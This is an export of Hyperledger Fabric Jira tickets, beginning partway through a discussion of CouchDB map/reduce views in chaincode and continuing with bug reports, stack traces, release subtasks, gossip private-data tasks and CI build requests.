9:14 PM;akdj;hello, i asked help in [https://chat.hyperledger.org/channel/chaincode-dev]

and then I was invited to add my use case here to have help in the future.

I need to use map/reduce ability in the chaincode for my use case, 

for example, I made several creation of marbles and I published marbles data in the blockchain,  there are attributs as colors, weights, and creation timestamp.

so there are two abilities that I need, 

the fisrt one, it map/reduce ability, to know, for instance, the total weight of ""red"" marbles 

the second one, it to find out which marble is the most recent creation, with the creation timestamp.

 

thanks;;;","15/Jul/19 2:01 AM;josejuanmontiel;hello, in our project we face this necessity and we made a custom image with this functionality. we would like to share it, in the branch 1.3 (the one we are using now) and later in 1.4. At the begining, we started with basic functionality, we'll iterate to make it's possible deploy the view in CouchDB (like the index are doing now). I post a list of files we just modifcate. If it's could be interesting to integrate this feature in the branch, we could made CR to start the new development.

!image-2019-07-14-18-59-44-846.png|width=350,height=496!!image-2019-07-14-19-00-53-731.png|width=267,height=103!;;;","29/Aug/19 3:34 AM;denyeart;Maintainers discussed and determined best practice for aggregate queries is to utilize a downstream data store rather than support aggregate queries in fabric core.

See pattern recommended at https://hyperledger-fabric.readthedocs.io/en/release-1.4/couchdb_as_state_database.html#good-practices-for-queries.;;;","20/Sep/19 11:03 PM;jambonrose;[~denyeart]: Thanks for considering the issue. Would you mind expanding on the reasoning behind preventing the use of CouchDB views? Alternatively, could you point me at the specific chat or core meeting where this was discussed?

We considered views to provide the total count for a type of document. Specifically, when paginating results, we'd like to provide both the number of objects included in the result as well as the total number in state. We expected to count objects with a design document such as the one presented below (but were unclear on how to access the actual result).
{code:java}
# using the Node SDK
ctx.stub.putState(
    ""_design/appName"",
    Buffer.from(
        JSON.stringify(
            {
                ""views"": {
                    ""countDocs"": {
                        ""map"": ""function(doc) {if(...) {emit(doc._id, doc._id);}}"",
                        ""reduce"": ""_count""
                    }
                }
            }
        )
    )
)
{code}
The put state handler, however, raises an error due to the underscore at the beginning of the key (required by CouchDB).

Using a separate service and database simply to provide the full count of a type of document feels like overkill to me, but I'd like to understand the problem and possible options before making any choices.;;;","24/Sep/19 2:28 AM;josejuanmontiel;hi all,

i can imagine the reasons, but could be interesting know why not use the power of views, to count or aggreate results.

I ask in couchdb user list a quick question about performance https://lists.apache.org/thread.html/d2fdf6e19eac858148927024432f37d129e7f84ac1b9d8a1b01e270e@%3Cuser.couchdb.apache.org%3E

here, in hyperledger we have indexs, why not views?, in this way we could simplify systems with simple necesities of counting ""large"" group of results.

 ;;;","26/Sep/19 1:30 AM;denyeart;[~jambonrose] [~josejuanmontiel] You are right that it is a slippery slope... what the maintainers concluded was that the scope of the peer was starting to expand to unmaintainable scope (e.g. the lifecycle management of database artifacts), and therefore the overall direction is to keep peer focused on its core responsibility as a transaction processor. Non-core functions that are further down the slippery slope, such as aggregate and analytic queries, would be off-loaded to downstream databases that are more fit-for-purpose. ;;;","26/Sep/19 2:44 PM;josejuanmontiel;hi [~denyeart],

first of all, let me use this closed ticket to make some comment and question (i haven't another way), and second i'm doing this from the respect (don't take as criticism), i'm doing as newbie blockchain (dlt) developer with a project in production.

i understand that keep it simple, and focused in performance it's the best way to accomplish the best throughput in the insertion, when people talk about hyperledger, always talk about TransactionPerSeconds. But, if the index are for improve the performance of queries (when you have more than 1000 asset in the dlt, to respond insede the timeout of the smartcontract) the result of this queries must be enought small to iterate inside the timeout, not? Your model has to permit find what you want, with small iterations of the results, right?

if your model expand outside the limits, it's when you need consider the best practices to extract this queries outside using as transport layer the events. In this case, why not consider an inprove of hyperledger 1.4.3 that permite use a commiter peer (as i understand now, in recents conversations) the only use is as some kind of backup... to permit some kind of smart contract that only GET and QUERIES... queries with views.

imho, as newbie developer (less than a year) move outside the DLT the queries, make the trust between the participants... untrusted. The events are trusted, all receive the same, but the interpretation of this events in the bussines domain model, couldn't be, even with an API (outside the DLT) to interpretate it.

Thanks a lot.

 

 

 

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Check ChaincodeId in HeaderExtension,FAB-5529,19600,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,30/Jul/17 6:30 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Jul/17 7:30 PM,v1.0.0,,,v1.0.1,,fabric-peer,,,,,,0,,,,,,,"There is a missing check in the endorser code.

{code}
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x10 pc=0x78e274]

goroutine 938 [running]:
panic(0xbeee20, 0xc420012090)
        /home/yacovm/go/src/runtime/panic.go:500 +0x1a1
github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposal(0xc4200ace00, 0x7f0db6c3bca8, 0xc4202d41b0, 0xc4202d42d0, 0x0, 0x0, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/core/endorser/endorser.go:384 +0x364
github.com/hyperledger/fabric/protos/peer._Endorser_ProcessProposal_Handler(0xc83d00, 0xc4200ace00, 0x7f0db6c3bca8, 0xc4202d41b0, 0xc4202b1f40, 0x0, 0x0, 0x0, 0x4, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/protos/peer/peer.pb.go:112 +0x27d
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).processUnaryRPC(0xc4201a68c0, 0x1314540, 0xc4201811e0, 0xc42000bf00, 0xc4200a9d40, 0x12f2ea0, 0xc4202d4270, 0x0, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:797 +0xd14
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).handleStream(0xc4201a68c0, 0x1314540, 0xc4201811e0, 0xc42000bf00, 0xc4202d4270)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:997 +0x7a0
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1.1(0xc4202c5570, 0xc4201a68c0, 0x1314540, 0xc4201811e0, 0xc42000bf00)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:561 +0xab
created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:562 +0xa3
{code}
",,C0rWin,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya33:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jul/17 6:55 AM;C0rWin;[~yacovm] can you please add some details on how this exception could be reproduced?;;;","30/Jul/17 7:07 AM;yacovm;Yes. You need to write custom code that sends a proposal with a nil chaincodeID.
I was in a hurry so I didn't add too many details.
Now I also uploaded a test.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Revendor bccsp,FAB-5530,19601,19393,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,30/Jul/17 8:51 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,31/Jul/17 5:52 PM,v1.0.0,,,v1.0.1,,fabric-ca,,,,,,0,,,,,,,FAB-5407 fixes an issue with the bccsp package so this task is to revendor in fabric-ca once the fix is merged,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5407,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya3b:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Jul/17 2:40 AM;mastersingh24;https://gerrit.hyperledger.org/r/12049;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create 1.0.1 patch for fabric-ca,FAB-5531,19602,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,31/Jul/17 2:42 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Aug/17 8:11 PM,,,,v1.0.1,,fabric-release,,,,,,0,,,,,,,"1) cherry-pick CRs targetted for patch

2) Squash cherry-picks into single commit

3) Submit for review against release branch",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5497,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya3j:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Jul/17 7:41 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/12053/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Release Hyperledger Fabric  CA v1.0.1,FAB-5532,19603,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,31/Jul/17 2:43 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Aug/17 8:12 PM,,,,v1.0.1,,fabric-release,,,,,,0,,,,,,,"*MUST BE REBASED JUST BEFORE MERGING*

Check for clean CI passes

Update Makefile

{{BASE_VERSION = 1.0.1}}
 {{PREV_VERSION = 1.0.0}}
 {{IS_RELEASE = true}}

change log should be generated just *after* *rebasing* to pick up the last minute merged CRs 

update release_notes/v1.0.1.txt",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5520,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya3r:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Jul/17 7:40 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/12055/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Extend protobuf message to include private data,FAB-5533,19604,18789,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,31/Jul/17 6:49 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,09/Aug/17 4:25 PM,,,,,,fabric-gossip,,,,,,0,active,gossip,,,,,"Currently gossip has two messages to request and replicate ledger state, represented as following:

{code}
// RemoteStateRequest is used to ask a set of blocks
// from a remote peer
message RemoteStateRequest {
    uint64 start_seq_num = 1;
    uint64 end_seq_num = 2;
}

// RemoteStateResponse is used to send a set of blocks
// to a remote peer
message RemoteStateResponse {
    repeated Payload payloads = 1;
}
{code}

Those message has to be extended to reflect the need to replicate private data for underlying transactions in the block.",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya3z:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add new gossip messages to replicate distributed private data via state transfer,FAB-5534,19605,18789,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,31/Jul/17 6:54 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,09/Aug/17 4:25 PM,,,,,,,,,,,,0,active,gossip,,,,,"In order to support dissemination of private data based on collections policies across the channel, new type of messages need to be added to support this feature. 

1. Message to request replication of private data
2. Gossip message which include routing information based on collections with private data routed.",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya47:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Transient data coordinator,FAB-5535,19607,18789,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,31/Jul/17 7:36 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,09/Aug/17 4:25 PM,,,,,,fabric-gossip,,,,,,0,active,gossip,,,,,"There is a need to coordinate arrival of blocks and replication of private data to allow committing data atomically into ledger. The task is to capture the need to add the implementation of the coordinator and connect it to state transfer and ledger. Coordinator expected to the keep track on incoming private sets and once it collected  all collections data for block deliver it into the ledger.

Also need to provide an interface for transient store to support persistence and crash resilience into the peer code.",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya4f:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve unit tests for /fabric/common/util package,FAB-5536,19608,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ynamiki,ynamiki,ynamiki,31/Jul/17 10:58 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,30/Sep/17 9:16 PM,v1.0.0,,,v1.1.1,,fabric-quality,,,,,,0,,,,,,,,,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzya4n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Jul/17 11:02 AM;ynamiki;https://gerrit.hyperledger.org/r/12051;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Getting transaction payload from chaincode,FAB-5537,19609,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Hangyu_FJH,Hangyu_FJH,Hangyu_FJH,31/Jul/17 1:29 PM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,13/Dec/17 4:04 PM,v1.1.0,,,v1.1.1,,,,,,,,0,chaincode,,,,,,"Right now, the client can get the transaction info by invoking the qscc installed on peer. We think it is necessary to extend this function to chaincode side. Since currently chaincode only has access to worldstate, the transaction payload are both recorded in worldstate and blockchain in some cases, which causes redundancy. If the chaincode can extract the payload directly out of the blockchain, the data needed to be recorded to worldstate can be greatly reduced. Especially in the case of  providing tractability among transactions, with this function, the chaincode only needs to records the link of related transaction IDs and gets the payload from blockchain, instead of recording all the information. ",,Hangyu_FJH,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzya4v:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,Hangyu_FJH,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix orderer-related CI failures,FAB-5539,19613,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sanchezl,kchristidis,kchristidis,31/Jul/17 9:32 PM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,31/Jul/17 9:39 PM,v1.0.0,,,DUPLICATE,,fabric-orderer,,,,,,0,ci,,,,,,"Fix the occasional CI failures that are attributed to the orderer component.

See:

[https://jenkins.hyperledger.org/job/fabric-verify-x86_64/14573/console]

[https://jenkins.hyperledger.org/job/fabric-verify-z/10232/console]",,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5527,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzya5j:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Jul/17 9:39 PM;kchristidis;Duplicate of 5527 that Luis is already tracking, closing.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Merge master into release branch,FAB-5540,19614,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,31/Jul/17 10:12 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Sep/17 5:34 PM,,,,,,fabric-samples,,,,,,0,,,,,,,"The default branch for fabric-samples is the release branch so we need to merge master into release to update release with the latest content.

Given that the fabric-samples are still based on 1.0.X, a merge will be safe",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya5r:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Aug/17 6:22 PM;mastersingh24;https://gerrit.hyperledger.org/r/12061;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[CI] - Plugin incompaitable issues causing hyperledger fabric CI jobs failures,FAB-5541,19615,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,rameshthoomu,rameshthoomu,rameshthoomu,31/Jul/17 10:26 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Aug/17 10:55 AM,v1.0.0-rc1,,,v1.0.1,,fabric-build,,,,,,0,build-system,,,,,,"Observed all CI builds are failing  with the below error. Seems recent updates on the Gerri-trigger plugin is not compatible or recent java updates might be causing this error.
{code:java}
0:00:29.244 java.lang.NoSuchMethodError: org.eclipse.jgit.revwalk.RevWalk.release()V
00:00:29.244     at com.sonyericsson.hudson.plugins.gerrit.trigger.hudsontrigger.GerritTriggerBuildChooser$1.invoke(GerritTriggerBuildChooser.java:185)
00:00:29.244     at com.sonyericsson.hudson.plugins.gerrit.trigger.hudsontrigger.GerritTriggerBuildChooser$1.invoke(GerritTriggerBuildChooser.java:166)
00:00:29.244     at org.jenkinsci.plugins.gitclient.AbstractGitAPIImpl.withRepository(AbstractGitAPIImpl.java:29)
00:00:29.244     at org.jenkinsci.plugins.gitclient.CliGitAPIImpl.withRepository(CliGitAPIImpl.java:71)
00:00:29.244     at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
00:00:29.244     at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
00:00:29.244     at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
00:00:29.244     at java.lang.reflect.Method.invoke(Method.java:606)
00:00:29.244     at hudson.remoting.RemoteInvocationHandler$RPCRequest.perform(RemoteInvocationHandler.java:895)
00:00:29.244     at hudson.remoting.RemoteInvocationHandler$RPCRequest.call(RemoteInvocationHandler.java:870)
00:00:29.244     at hudson.remoting.RemoteInvocationHandler$RPCRequest.call(RemoteInvocationHandler.java:829)
00:00:29.244     at hudson.remoting.UserRequest.perform(UserRequest.java:153)
00:00:29.244     at hudson.remoting.UserRequest.perform(UserRequest.java:50)
00:00:29.244     at hudson.remoting.Request$2.run(Request.java:336)
00:00:29.244     at hudson.remoting.InterceptingExecutorService$1.call(InterceptingExecutorService.java:68)
00:00:29.244     at java.util.concurrent.FutureTask.run(FutureTask.java:262)
00:00:29.244     at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
00:00:29.244     at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
00:00:29.244     at java.lang.Thread.run(Thread.java:745)
00:00:29.244     at ......remote call to ubuntu1604-x86_64-4c-4g-1551(Native Method)
00:00:29.244     at hudson.remoting.Channel.attachCallSiteStackTrace(Channel.java:1545)
00:00:29.244     at hudson.remoting.UserResponse.retrieve(UserRequest.java:253)
00:00:29.244     at hudson.remoting.Channel.call(Channel.java:830)
00:00:29.244 Caused: java.io.IOException: Remote call on ubuntu1604-x86_64-4c-4g-1551 failed
00:00:29.244     at hudson.remoting.Channel.call(Channel.java:838)
00:00:29.244     at hudson.remoting.RemoteInvocationHandler.invoke(RemoteInvocationHandler.java:257)
00:00:29.244     at com.sun.proxy.$Proxy96.withRepository(Unknown Source)
00:00:29.244     at org.jenkinsci.plugins.gitclient.RemoteGitImpl.withRepository(RemoteGitImpl.java:235)
00:00:29.244     at com.sonyericsson.hudson.plugins.gerrit.trigger.hudsontrigger.GerritTriggerBuildChooser.getFirstParent(GerritTriggerBuildChooser.java:166)
00:00:29.245     at com.sonyericsson.hudson.plugins.gerrit.trigger.hudsontrigger.GerritTriggerBuildChooser.prevBuildForChangelog(GerritTriggerBuildChooser.java:132)
00:00:29.245     at hudson.plugins.git.GitSCM.computeChangeLog(GitSCM.java:1257)
00:00:29.245     at hudson.plugins.git.GitSCM.checkout(GitSCM.java:1182)
00:00:29.245     at hudson.scm.SCM.checkout(SCM.java:496)
00:00:29.245     at hudson.model.AbstractProject.checkout(AbstractProject.java:1281)
00:00:29.245     at hudson.model.AbstractBuild$AbstractBuildExecution.defaultCheckout(AbstractBuild.java:604)
00:00:29.245     at jenkins.scm.SCMCheckoutStrategy.checkout(SCMCheckoutStrategy.java:86)
00:00:29.245     at hudson.model.AbstractBuild$AbstractBuildExecution.run(AbstractBuild.java:529)
00:00:29.245     at hudson.model.Run.execute(Run.java:1728)
00:00:29.245     at hudson.model.FreeStyleBuild.run(FreeStyleBuild.java:43)
00:00:29.245     at hudson.model.ResourceController.execute(ResourceController.java:98)
00:00:29.245     at hudson.model.Executor.run(Executor.java:405){code}",hyperledger Jenkins,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya5z:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enforce orderers to use identical genesis file,FAB-5542,19616,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,guoger,guoger,31/Jul/17 10:48 PM,23/Jan/20 6:57 AM,28/Oct/23 3:00 AM,23/Jan/20 6:57 AM,v1.0.2,,,,,fabric-orderer,,,,,,0,help-wanted,stale-item,,,,,"Orderers should be strictly enforced to boot with identical genesis file (with same hash), otherwise it would result in divergent blockchain.

Therefore, orderer should broadcast its genesis file hash when startup, and halts upon mismatch. However, we should allow at least one 'winner' in the network, so a newly joined orderer with different genesis hash won't bring down the whole network.",,guoger,indirajith,kchristidis,mastersingh24,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5450,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzya67:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,guoger,indirajith,kchristidis,mastersingh24,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Aug/17 8:16 PM;mastersingh24;I don't consider this to be a bug. [~kchristidis] or [~jyellick] - thoughts?;;;","01/Aug/17 11:39 PM;kchristidis;Perhaps ""improvement"" is the correct labeling. I can see the behavior described here as a useful improvement on the existing flow.;;;","23/Jan/20 6:57 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
refactor all hard-coded version strings ,FAB-5543,19617,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,ChristopherFerris,ChristopherFerris,31/Jul/17 10:56 PM,23/Jan/20 6:57 AM,28/Oct/23 3:00 AM,23/Jan/20 6:57 AM,v1.0.0,,,Future,,fabric-build,,,,,,0,stale-item,,,,,,We have entirely too many places where we have to change the version string in scripts and yaml files etc. These should be pulling from a single place we can update to progress a version.,,ChristopherFerris,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzya6f:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Sep/18 5:18 AM;denyeart;Bulk Jira update:
For remaining tasks with FixVersion v1.3.0, the Reporter should update to v1.4.0 or Future, or Close.
Add a comment with any clarification needed, so that release managers can close out v1.3.0 release cleanly.;;;","09/Oct/18 11:43 PM;denyeart;[~ChristopherFerris] It's gotten a little better, but not enough. Do you have a proposal for moving this forward?;;;","23/Jan/20 6:57 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[CI] - Developer should be able to trigger failed CI jobs dynamically from Gerrit,FAB-5544,19618,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ryjones,rameshthoomu,rameshthoomu,31/Jul/17 11:10 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,18/Aug/17 5:24 AM,Future,,,,,fabric-build,,,,,,1,build-system,,,,,,"reverify and recheck comment phrases in Gerrit will trigger all the builds but developers would like to dynamically trigger only failed builds from Gerrit patch sets.. This way they no need to apply ""reverify"" or ""recheck"" to trigger one failed builds.",,jtclark,kchristidis,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya6n:",,,,,,,,,,,,,,,,,,,,,,,jtclark,kchristidis,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Aug/17 4:45 AM;rameshthoomu;Developer now can trigger specific failed jobs from *fabric* gerrit patch sets with the below comment phrases. 

{{*rebuild-x:* {color:#f79232}reruns fabric-verify-x86_64{color}}}
{{*rebuild-z:* {color:#f79232}reruns fabric-verify-z{color}}}
{{*rebuild-e2e:* {color:#f79232}reruns fabric-verify-end-2-end-x86_64{color}}}
{{*rebuild-behave:* {color:#f79232}reruns fabric-verify-behave-x86_64{color}}}

existing *`recheck`* and *`reverify`* also works but this triggers all the jobs associated to the patch set.

please see one such example here https://gerrit.hyperledger.org/r/#/c/12557/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Set up Makefile to allow fabric to be a git submodule,FAB-5545,19619,19622,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,31/Jul/17 11:24 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Nov/17 7:58 PM,,,,,,fabric-build,,,,,,0,,,,,,,"We would like to include the fabric repository as a git submodule in our repository as a dependency. Ideally, we would be able to build the necessary images and executables that are needed from this submodule. 

